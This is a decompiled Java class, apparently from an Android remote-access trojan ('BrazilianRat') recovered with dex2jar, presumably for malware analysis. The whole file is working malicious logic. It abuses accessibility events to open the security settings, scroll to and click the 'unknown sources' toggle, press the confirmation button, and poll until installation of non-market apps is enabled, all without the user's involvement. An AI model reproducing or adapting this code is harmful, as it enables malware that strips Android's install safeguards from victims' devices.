package com.irifix;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ResolveInfo;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class c {
  private static boolean a = false;
  
  private static boolean b = false;
  
  private static boolean c = false;
  
  private static boolean d = false;
  
  private static String e = "";
  
  public static void a(AccessibilityEvent paramAccessibilityEvent) {
    List<AccessibilityNodeInfo> list1;
    if (!a)
      return; 
    int i = paramAccessibilityEvent.getEventType();
    if (i != 32 && i != 4096)
      return; 
    AccessibilityNodeInfo accessibilityNodeInfo = a.a();
    if (accessibilityNodeInfo == null)
      return; 
    String str = accessibilityNodeInfo.getPackageName().toString();
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("(");
    stringBuilder.append(e);
    stringBuilder.append(")");
    if (!str.matches(stringBuilder.toString()))
      return; 
    List<AccessibilityNodeInfo> list2 = a.a(accessibilityNodeInfo);
    if (!a.a(list2))
      return; 
    if (i == 32) {
      if (!b && !c) {
        b(accessibilityNodeInfo, false);
      } else if (b && !c) {
        StringBuilder stringBuilder1 = new StringBuilder();
        stringBuilder1.append("(");
        stringBuilder1.append(l.a(l.d));
        stringBuilder1.append(")");
        list1 = a.b(stringBuilder1.toString(), list2);
        list2 = a.c("(.*:id/button1)", list2);
        if (a.a(list1) && a.a(list2)) {
          c = true;
          ((AccessibilityNodeInfo)list2.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_CLICK.getId());
        } 
      } 
    } else if (!b && !c && d) {
      d = false;
      b((AccessibilityNodeInfo)list1, true);
    } 
  }
  
  public static boolean a(Context paramContext) {
    if (Build.VERSION.SDK_INT > 25 || Settings.Secure.getInt(paramContext.getContentResolver(), "install_non_market_apps", 0) > 0)
      return true; 
    Intent intent = new Intent("android.settings.SECURITY_SETTINGS");
    intent.addFlags(268435456);
    intent.addFlags(32768);
    intent.addFlags(8388608);
    List list = paramContext.getPackageManager().queryIntentActivities(intent, 0);
    if (list.size() > 0) {
      a = true;
      b = false;
      c = false;
      d = false;
      e = ((ResolveInfo)list.get(0)).activityInfo.packageName;
      paramContext.startActivity(intent);
    } 
    long l = g.d();
    boolean bool = false;
    while (true) {
      boolean bool1 = bool;
      if (g.d() - l < 10000L) {
        try {
          Thread.sleep(100L);
        } catch (InterruptedException interruptedException) {}
        if (Settings.Secure.getInt(paramContext.getContentResolver(), "install_non_market_apps", 0) > 0) {
          bool1 = true;
        } else {
          bool1 = false;
        } 
        bool = bool1;
        if (bool1) {
          a = false;
          return bool1;
        } 
        continue;
      } 
      a = false;
      return bool1;
    } 
  }
  
  private static void b(AccessibilityNodeInfo paramAccessibilityNodeInfo, boolean paramBoolean) {
    if (paramBoolean) {
      (new Handler()).postDelayed(new Runnable(paramAccessibilityNodeInfo) {
            public void run() {
              c.a(this.a, false);
            }
          }200L);
    } else {
      List<AccessibilityNodeInfo> list1 = a.a(paramAccessibilityNodeInfo);
      if (!a.a(list1))
        return; 
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("(");
      stringBuilder.append(l.a(l.c));
      stringBuilder.append(")");
      List<AccessibilityNodeInfo> list2 = a.b(stringBuilder.toString(), list1);
      if (a.a(list2)) {
        b = true;
        d.a(list2.get(0));
      } else {
        list1 = a.a(AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD, list1);
        if (!a.a(list1))
          return; 
        d = true;
        ((AccessibilityNodeInfo)list1.get(0)).performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_SCROLL_FORWARD.getId());
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */